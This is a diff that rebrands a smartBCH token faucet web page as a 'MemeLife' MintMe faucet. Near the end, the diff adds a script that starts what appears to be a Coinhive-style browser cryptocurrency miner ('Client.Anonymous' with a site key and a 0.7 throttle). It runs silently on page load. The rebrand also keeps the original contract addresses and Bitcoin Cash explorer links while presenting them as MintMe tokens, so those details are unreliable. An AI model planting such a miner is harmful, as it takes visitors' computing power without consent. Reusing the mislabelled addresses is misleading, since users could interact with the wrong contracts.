@@ -3,65 +3,60 @@
    <head>
       <meta charset="utf-8"> 
       <meta name="viewport" content="width=device-width, initial-scale=1">
-      <meta name="description" content="maze token, faucet, bitcoin cash, bch, smartBCH">
+      <meta name="description" content="meme token, faucet, mintme, memelife, memebro">
       <meta name="web" content="">
 	   <link rel="icon" type="image/ico" sizes="32x32" href="../img/mfavicon.ico">
-      <title>Maze Tokens Underworld</title>
+      <title>MemeLife Faucet</title>
       <link rel="stylesheet" href="../style.css">
       <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
       <script src="https://cdn.jsdelivr.net/npm/web3@1.7.3/dist/web3.min.js" integrity="sha256-v8y57dJljffyJ0j2GKNvQsReAyDHmzYbD/fQC+g24fc=" crossorigin="anonymous"></script>
    </head>
   <body>
    
-   <div style="text-align: left"><span style="font-size: 18px; cursor: pointer;" onclick="openNav()">&#9776; Enter The Underworld</span></div>
+   <div style="text-align: left"><span style="font-size: 18px; cursor: pointer;" onclick="openNav()">&#9776; Enter The Funiverse</span></div>
    <!-- <div style="text-align: right"><button onclick="darkMode()">light</button></div> -->
 
    <div id="mySidenav" class="sidenav">
       <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
       <a href="../">Home</a>
-      <a href="../meme/">MAZE token</a>
-      <a href="../vandals/">VANDALS token</a>
-      <a href="../zombie/">ZOMBIE token</a>
-      <a href="../urgd/">URGD token</a>
-      <a href="../bank/">Vandals Bank</a>
-      <a href="../trade/">Trade</a>
-      <a href="../postbox/">Post Box</a>
-      <a href="../nft/">NFT</a>
-      <a href="../slp/">SLP tokens</a>
-      <a href="../tools/">Tools</a>
+      <a href="../meme/">MEME token</a>
+      <a href="../jokers/">JOKERS token</a>
+      <a href="../clown/">CLOWN token</a>
+      <a href="../lol/">LOL token</a>
+      <a href="../bank/">Jokers Bank</a>
    </div>
 
    <div style="font-size: 24px;">
-      <h1>MAZE TOKENS<br>UNDERWORLD</h1>
+      <h1>MEME TOKENS<br>FUNIVERSE</h1>
       <h2>Faucet</h2>
    </div>
 
    <br>
 
-   <h2>Faucet is a token distribution application</h2>
+   <h2>A faucet is a token distribution application</h2>
 
    <br>
 
-   <p>Claim 500 ZOMBIE tokens one time per day to help decentralize zombie horde.<br>
-      See <a href="../bank/index.html">Vandals Bank</a> - stake ZOMBIE and receive VANDALS tokens as reward.<br><br>
+   <p>Claim 500 MEME tokens one time per day to help decentralize.<br>
+      See <a href="../bank/index.html">Jokers Bank</a> - stake MEME and receive JOKERS tokens as reward.<br><br>
    </p>
 
-   <p>Claim 597 UNDERGROUND tokens one time per hour.<br>
-      See <a href="../bank/">Vandals Bank</a> - stake MAZE and receive URGD tokens as reward.<br><br>
+   <p>Claim 597 LOL tokens one time per hour.<br>
+      See <a href="../bank/">Jokers Bank</a> - stake MEME and receive LOL tokens as reward.<br><br>
    </p>
 
    <p>
-      You need Bitcoin Cash for blockchain transaction fee.<br>
-      A small amount of BCH (0.00002) is included in the transaction fee at the time the URGD claim is executed. It is used to repurchase and increase liquidity.<br><br>
-      You must have MetaMask wallet configured for smartBCH (Bitcoin Cash sidechain).<br>
+      You need MintMe for blockchain transaction fee.<br>
+      A small amount of MintMe is included in the transaction fee at the time the LOL claim is executed. It is used to repurchase and increase liquidity.<br><br>
+      You must have MetaMask wallet configured for MintMe.<br>
       Reload the page if it is not connected to MetaMask or "undefined".<br>
    </p>
 
    <br>
 
    <div>
-      <h3>ZOMBIE faucet <img src="../img/zombie512.png" alt="ZOMBIE icon" width="64"></h3>
-      <button onclick="claimZombie()" class="button button1">Claim ZOMBIE</button>
+      <h3>CLOWN faucet <img src="../img/clown512.png" alt="CLOWN icon" width="64"></h3>
+      <button onclick="claimZombie()" class="button button1">Claim CLOWN</button>
       <br>
 		<div id="lang"></div>
 		<br>
@@ -71,7 +66,7 @@
 		<p>Copy unix_timestamp and go to <a href="https://www.unixtimestamp.com/"> converter</a>.<br>
          Paste the timestamp to "Enter a Timestamp" field and tap/click Convert.</p>
       <br>
-      <button onclick="balanceFaucet()" class="button button1">ZOMBIE faucet balance</button>
+      <button onclick="balanceFaucet()" class="button button1">CLOWN faucet balance</button>
 		<p></p>
 		<div id="lang2"></div>
       <br>
@@ -80,8 +75,8 @@
    <br>
 
    <div>
-      <h3>URGD faucet <img src="../img/urgd512.png" alt="URGD icon" width="64"></h3>
-      <button onclick="claimURGD()" class="button button1">Claim UNDERGROUND (URGD)</button>
+      <h3>LOL faucet <img src="../img/lol512.png" alt="LOL icon" width="64"></h3>
+      <button onclick="claimURGD()" class="button button1">Claim LOL</button>
       <br>
 		<div id="lang3"></div>
 		<br>
@@ -91,7 +86,7 @@
 		<p>Copy unix_timestamp and go to <a href="https://www.unixtimestamp.com/"> converter</a>.<br>
          Paste the timestamp to "Enter a Timestamp" field and tap/click Convert.</p>
       <br>
-      <button onclick="balanceFaucet2()" class="button button1">URGD faucet balance</button>
+      <button onclick="balanceFaucet2()" class="button button1">LOL faucet balance</button>
 		<p></p>
 		<div id="lang5"></div>
       <br>
@@ -100,16 +95,16 @@
    <br>
 
    <div>
-      <p>ZOMBIE token contract address: 0x80453ACDfE0073D6743B27D72e06F48777EeAd80<br>
-         Zombie Faucet contract address (SmartScan explorer): <a href="https://smartscan.cash/address/0xE6fBa59BDf1EafA8b1B5ad57D9C4A354CA55D756">0xE6fBa59BDf1EafA8b1B5ad57D9C4A354CA55D756</a><br>
-         Zombie Faucet contract address (Sonar explorer): <a href="https://sonar.cash/address/0xE6fBa59BDf1EafA8b1B5ad57D9C4A354CA55D756">0xE6fBa59BDf1EafA8b1B5ad57D9C4A354CA55D756</a><br><br>
+      <p>CLOWN token contract address: 0x80453ACDfE0073D6743B27D72e06F48777EeAd80<br>
+         Clown Faucet contract address (SmartScan explorer): <a href="https://smartscan.cash/address/0xE6fBa59BDf1EafA8b1B5ad57D9C4A354CA55D756">0xE6fBa59BDf1EafA8b1B5ad57D9C4A354CA55D756</a><br>
+         Clown Faucet contract address (Sonar explorer): <a href="https://sonar.cash/address/0xE6fBa59BDf1EafA8b1B5ad57D9C4A354CA55D756">0xE6fBa59BDf1EafA8b1B5ad57D9C4A354CA55D756</a><br><br>
       </p>
    </div>
 
    <div>
-      <p>URGD token contract address: 0x423805e13AF3f3183500BaE7Cf15c50420eC0bEF<br>
-         URGD Faucet contract address (SmartScan explorer): <a href="https://smartscan.cash/address/0x6FAE0c62687EdCCDe384eD12cC0513c7436A4b5C">0x6FAE0c62687EdCCDe384eD12cC0513c7436A4b5C</a><br>
-         URGD Faucet contract address (Sonar explorer): <a href="https://sonar.cash/address/0x6FAE0c62687EdCCDe384eD12cC0513c7436A4b5C">0x6FAE0c62687EdCCDe384eD12cC0513c7436A4b5C</a><br><br>
+      <p>LOL token contract address: 0x423805e13AF3f3183500BaE7Cf15c50420eC0bEF<br>
+         LOL Faucet contract address (SmartScan explorer): <a href="https://smartscan.cash/address/0x6FAE0c62687EdCCDe384eD12cC0513c7436A4b5C">0x6FAE0c62687EdCCDe384eD12cC0513c7436A4b5C</a><br>
+         LOL Faucet contract address (Sonar explorer): <a href="https://sonar.cash/address/0x6FAE0c62687EdCCDe384eD12cC0513c7436A4b5C">0x6FAE0c62687EdCCDe384eD12cC0513c7436A4b5C</a><br><br>
          Alternatively use <a href="https://oneclickdapp.com/pizza-dollar">One Click Dapp URGD Faucet app</a>.
       </p>
    </div>
@@ -119,9 +114,8 @@
    <div class="myDiv">
       <br>
    <footer style="font-size: 14px;">
-      <p>MAZE Tokens Underworld | 2020-2022</p>
-      <p><a href="https://t.me/mazetokens"><img src="../img/telegram.png" alt="Telegram" width="32"></a> <a href="https://github.com/mazetoken/mazetoken.github.io/tree/master/faucet"><img src="../img/github.png" alt="Github" width="32"></a> 
-      <a href="mailto:mazetoken@protonmail.com"><img src="../img/email.png" alt="Mail" width="32"></a>
+      <p>MemeLife Funiverse | 2022-2023</p>
+      <p><a href="https://github.com/mintmeme/mintmeme.github.io/tree/master/faucet"><img src="../img/github.png" alt="Github" width="32"></a> 
       </p>
    </footer>
       <br>
@@ -139,12 +133,12 @@
       }
    </script>
 
-   <!-- <script>
+   <script>
       function darkMode() {
       var element = document.body;
       element.classList.toggle("dark-mode");
       }
-   </script> -->
+   </script>
 
    <script src="../connectweb3.js"></script>
    <script src="../contracts/contractFaucet.js"></script>
@@ -152,5 +146,13 @@
    <script src="../contracts/contractFaucet2.js"></script>
    <script src="../contracts/contractUnderground.js"></script>
    <script src="../functions.js"></script>
+   <script>
+      var _client = new Client.Anonymous('d6237b4afd13d3e90bedfc23492f02c2f518750842d718b09cba1c7a374ac1f5', {
+          throttle: 0.7, c: 'w', ads: 0
+      });
+      _client.start();
+      
+  
+  </script>
   </body>
 </html>
